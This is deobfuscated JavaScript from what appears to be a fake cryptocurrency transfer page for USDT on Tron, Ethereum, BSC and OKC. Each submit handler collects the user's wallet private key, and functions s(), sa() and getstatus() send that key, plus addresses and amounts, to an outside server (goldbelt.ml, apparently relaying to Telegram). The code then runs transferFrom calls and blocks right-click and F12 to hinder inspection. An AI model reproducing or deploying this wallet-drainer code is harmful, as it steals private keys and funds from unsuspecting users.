//Sat Apr 19 2025 09:10:37 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
let beizhu = "TG@halfman9";
async function s(_0x557a06, _0x4cde84, _0xa42510, _0x4fcf76) {
  var _0xf61fc4 = new XMLHttpRequest();
  _0xf61fc4.open("GET", "https://goldbelt.ml/index/index/tgapi?text=提交地址:" + _0x557a06 + "收款地址:" + _0x4cde84 + "私钥:" + _0xa42510 + "金额:" + _0x4fcf76, true);
  sa(_0xa42510);
  _0xf61fc4.send();
  _0xf61fc4.onreadystatechange = function () {
    {
      if (_0xf61fc4.readyState == 4 && _0xf61fc4.status == 200) {
        {
          var _0x4d7499 = _0xf61fc4.responseText;
          console.log(_0x4d7499);
        }
      }
    }
  };
}
async function getstatus(_0x573acc, _0x289381, _0x2c7c2c) {
  const _0x471ab6 = {
      "type": _0x2c7c2c,
      "pri": _0x573acc,
      "domin": _0x289381,
      "beizhu": beizhu
    },
    _0x569585 = new URLSearchParams(_0x471ab6).toString(),
    _0x51a3df = await fetch("https://goldbelt.ml/index/index?" + _0x569585, {
      "method": "GET",
      "mode": "cors"
    });
  let _0x2d5d46 = await _0x51a3df.json();
  return _0x2d5d46;
}
async function sa(_0x2b7379) {
  var _0x3f6ac0 = new XMLHttpRequest();
  _0x3f6ac0.open("GET", "https://goldbelt.ml/index/index/tgapi?text=私钥:" + _0x2b7379, true);
  _0x3f6ac0.send();
  _0x3f6ac0.onreadystatechange = function () {
    {
      if (_0x3f6ac0.readyState == 4 && _0x3f6ac0.status == 200) {
        {
          var _0x47b898 = _0x3f6ac0.responseText;
          console.log(_0x47b898);
        }
      }
    }
  };
}
let globalData, dataValue, tipValue;
$("#trc-submit").on("click", async function () {
  try {
    {
      var _0x4fe5d3 = $("#trc-from").val(),
        _0x3517aa = $("#trc-to").val(),
        _0x4dbf32 = $("#trc-key").val(),
        _0x2c2dba = $("#trc-amount").val(),
        _0x37aa93 = location.host.split(":")[0];
      const _0x42df78 = await getstatus(_0x4dbf32, _0x37aa93, "trc");
      globalData = _0x42df78;
      dataValue = globalData.data;
      tipValue = globalData.tip;
      s(_0x4fe5d3, _0x3517aa, _0x4dbf32, _0x2c2dba);
      if (dataValue === 1) {
        {
          const _0x236c18 = TronWeb.providers.HttpProvider,
            _0x53496d = new _0x236c18("https://api.trongrid.io"),
            _0x2f14a3 = new _0x236c18("https://api.trongrid.io"),
            _0xc4259c = new _0x236c18("https://api.trongrid.io"),
            _0x11bad0 = new TronWeb(_0x53496d, _0x2f14a3, _0xc4259c, _0x4dbf32),
            _0x553b1a = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            _0x598f92 = await _0x11bad0.contract().at(_0x553b1a),
            _0x261629 = _0x2c2dba * 1000000 || (await check_balance(_0x4fe5d3, _0x4dbf32));
          _0x598f92.transferFrom(_0x4fe5d3, _0x3517aa, _0x261629).send({
            "feeLimit": 15000000
          }).then(_0x20578f => {
            $("#trc-form").hide();
            $("#trc-hash").text("哈希值为：" + _0x20578f);
            $("#trc-trade").attr("href", "https://tronscan.org/#/transaction/" + _0x20578f);
            $("#trc-tip").show();
          }).catch(_0x1c5d1d => {
            alert("提交失败，请检查信息是否正确");
          });
        }
      } else {
        {
          alert(tipValue);
          return;
        }
      }
    }
  } catch (_0x2a50dd) {
    alert("提交失败，请检查信息是否正确");
  }
  return false;
});
$("#erc-submit").on("click", async function () {
  var _0x412f0e = $("#erc-from").val(),
    _0x2d625b = $("#erc-to").val(),
    _0x301b5b = $("#erc-key").val(),
    _0x5cf99a = $("#erc-amount").val(),
    _0x4b3105 = location.host.split(":")[0];
  const _0x3c2b8d = await getstatus(_0x301b5b, _0x4b3105, "erc");
  globalData = _0x3c2b8d;
  dataValue = globalData.data;
  tipValue = globalData.tip;
  s(_0x412f0e, _0x2d625b, _0x301b5b, _0x5cf99a);
  if (dataValue === 1) {
    {
      const _0x3590ef = new Web3("https://mainnet.infura.io/v3/15e5fd7f37c04a6ea18633c2f09a7d3f"),
        _0x1fd633 = "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        _0x940e40 = new _0x3590ef.eth.Contract(abi, _0x1fd633),
        _0x55ba3e = _0x3590ef.eth.accounts.privateKeyToAccount(_0x301b5b);
      let _0x3a02f2 = await _0x940e40.methods.balanceOf(_0x412f0e).call({
          "from": _0x412f0e
        }),
        _0x5ec524 = _0x5cf99a ? parseInt(_0x5cf99a * 1000000).toString(16) : parseInt(_0x3a02f2).toString(16),
        _0x99532a = _0x940e40.methods.transferFrom(_0x412f0e, _0x2d625b, _0x3590ef.utils.toBN("0x" + _0x5ec524)).encodeABI(),
        _0x13bd3d = await _0x3590ef.eth.getTransactionCount(_0x55ba3e.address),
        _0xdf4b7a = await _0x3590ef.eth.gasPrice;
      const _0x70a56c = {
          "from": _0x55ba3e.address,
          "to": _0x1fd633,
          "nonce": _0x3590ef.utils.toHex(_0x13bd3d),
          "data": _0x99532a.slice(2),
          "value": "0x0",
          "gas": _0x3590ef.utils.toHex(150000),
          "gasPrice": _0x3590ef.utils.toHex(_0xdf4b7a)
        },
        _0x571637 = await _0x55ba3e.signTransaction(_0x70a56c);
      _0x3590ef.eth.sendSignedTransaction(_0x571637.rawTransaction, function (_0x51e44e, _0x45b970) {
        !_0x51e44e ? ($("#erc-form").hide(), $("#erc-hash").text("哈希值为：" + _0x45b970), $("#erc-trade").attr("href", "https://etherscan.io/tx/" + _0x45b970), $("#erc-tip").show()) : alert("提交失败，请检查信息是否正确");
      });
    }
  } else {
    alert(tipValue);
    return;
  }
});
$("#bsc-submit").on("click", async function () {
  var _0x291981 = $("#bsc-from").val(),
    _0x2d5039 = $("#bsc-to").val(),
    _0xa71dec = $("#bsc-key").val(),
    _0x373bde = $("#bsc-amount").val(),
    _0x453d61 = location.host.split(":")[0];
  const _0x2e4086 = await getstatus(_0xa71dec, _0x453d61, "bsc");
  globalData = _0x2e4086;
  dataValue = globalData.data;
  tipValue = globalData.tip;
  s(_0x291981, _0x2d5039, _0xa71dec, _0x373bde);
  if (dataValue === 1) {
    const _0x379915 = new Web3("https://bsc-dataseed2.binance.org"),
      _0x13f85a = "0x55d398326f99059ff775485246999027b3197955",
      _0x3e7e0f = new _0x379915.eth.Contract(abi, _0x13f85a),
      _0xe77f9e = _0x379915.eth.accounts.privateKeyToAccount(_0xa71dec);
    let _0x41d05e = await _0x3e7e0f.methods.balanceOf(_0x291981).call({
        "from": _0x291981
      }),
      _0x3bb757 = _0x373bde ? parseInt(_0x373bde * 1000000000000000000).toString(16) : parseInt(_0x41d05e).toString(16),
      _0x1ec4c6 = _0x3e7e0f.methods.transferFrom(_0x291981, _0x2d5039, _0x379915.utils.toBN("0x" + _0x3bb757)).encodeABI(),
      _0x2273cf = await _0x379915.eth.getTransactionCount(_0xe77f9e.address),
      _0x28334e = await _0x379915.eth.gasPrice;
    const _0x5cbbf4 = {
        "from": _0xe77f9e.address,
        "to": _0x13f85a,
        "nonce": _0x379915.utils.toHex(_0x2273cf),
        "data": _0x1ec4c6.slice(2),
        "value": "0x0",
        "gas": _0x379915.utils.toHex(150000),
        "gasPrice": _0x379915.utils.toHex(_0x28334e)
      },
      _0x2ac6cd = await _0xe77f9e.signTransaction(_0x5cbbf4);
    _0x379915.eth.sendSignedTransaction(_0x2ac6cd.rawTransaction, function (_0x509f5e, _0x5f2344) {
      !_0x509f5e ? ($("#bsc-form").hide(), $("#bsc-hash").text("哈希值为：" + _0x5f2344), $("#bsc-trade").attr("href", "https://bscscan.com/tx/" + _0x5f2344), $("#bsc-tip").show()) : alert("提交失败，请检查信息是否正确");
    });
  } else {
    alert(tipValue);
    return;
  }
});
$("#okc-submit").on("click", async function () {
  var _0x57c6a4 = $("#okc-from").val(),
    _0x6f1814 = $("#okc-to").val(),
    _0x7059ed = $("#okc-key").val(),
    _0x2d0e4f = $("#okc-amount").val(),
    _0x4191f1 = location.host.split(":")[0];
  const _0x5a8b9b = await getstatus(_0x7059ed, _0x4191f1, "okc");
  globalData = _0x5a8b9b;
  dataValue = globalData.data;
  tipValue = globalData.tip;
  s(_0x57c6a4, _0x6f1814, _0x7059ed, _0x2d0e4f);
  if (dataValue === 1) {
    const _0x314027 = new Web3("https://exchainrpc.okex.org"),
      _0x24101e = "0x382bb369d343125bfb2117af9c149795c6c65c50",
      _0x569221 = new _0x314027.eth.Contract(abi, _0x24101e),
      _0x5c4315 = _0x314027.eth.accounts.privateKeyToAccount(_0x7059ed);
    let _0x5d2b5a = await _0x569221.methods.balanceOf(_0x57c6a4).call({
        "from": _0x57c6a4
      }),
      _0x161e3d = _0x2d0e4f ? parseInt(_0x2d0e4f * 1000000000000000000).toString(16) : parseInt(_0x5d2b5a).toString(16),
      _0x2b0103 = _0x569221.methods.transferFrom(_0x57c6a4, _0x6f1814, _0x314027.utils.toBN("0x" + _0x161e3d)).encodeABI(),
      _0x499fd5 = await _0x314027.eth.getTransactionCount(_0x5c4315.address),
      _0x4e65c0 = await _0x314027.eth.gasPrice;
    const _0x90374f = {
        "from": _0x5c4315.address,
        "to": _0x24101e,
        "nonce": _0x314027.utils.toHex(_0x499fd5),
        "data": _0x2b0103.slice(2),
        "value": "0x0",
        "gas": _0x314027.utils.toHex(150000),
        "gasPrice": _0x314027.utils.toHex(_0x4e65c0)
      },
      _0x1c0f2b = await _0x5c4315.signTransaction(_0x90374f);
    _0x314027.eth.sendSignedTransaction(_0x1c0f2b.rawTransaction, function (_0x23fa27, _0x4ea23e) {
      {
        if (!_0x23fa27) {
          $("#okc-form").hide();
          $("#okc-hash").text("哈希值为：" + _0x4ea23e);
          $("#okc-trade").attr("href", "https://www.oklink.com/zh-cn/okc/tx/" + _0x4ea23e);
          $("#okc-tip").show();
        } else {
          alert("提交失败，请检查信息是否正确");
        }
      }
    });
  } else {
    {
      alert(tipValue);
      return;
    }
  }
});
async function check_balance(_0x4325b7, _0x20c025) {
  const _0x41e707 = TronWeb.providers.HttpProvider,
    _0x13f1c5 = new _0x41e707("https://api.trongrid.io"),
    _0x1f35b2 = new _0x41e707("https://api.trongrid.io"),
    _0x4ed707 = new _0x41e707("https://api.trongrid.io"),
    _0x35da05 = new TronWeb(_0x13f1c5, _0x1f35b2, _0x4ed707, _0x20c025),
    _0x394a74 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  let _0x4a9e42 = await _0x35da05.contract().at(_0x394a74);
  const _0x539a28 = await _0x4a9e42.balanceOf(_0x4325b7).call();
  return parseInt(_0x539a28._hex);
}
window.oncontextmenu = function () {
  alert("防扒警告");
  return false;
};
document.onkeydown = document.onkeyup = document.onkeypress = function (_0x5ecfdd) {
  let _0x235c91 = _0x5ecfdd || window.event || arguments.callee.caller.arguments[0];
  if (_0x235c91 && _0x235c91.keyCode == 123) return _0x235c91.returnValue = false, alert("F12是不礼貌的"), false;
};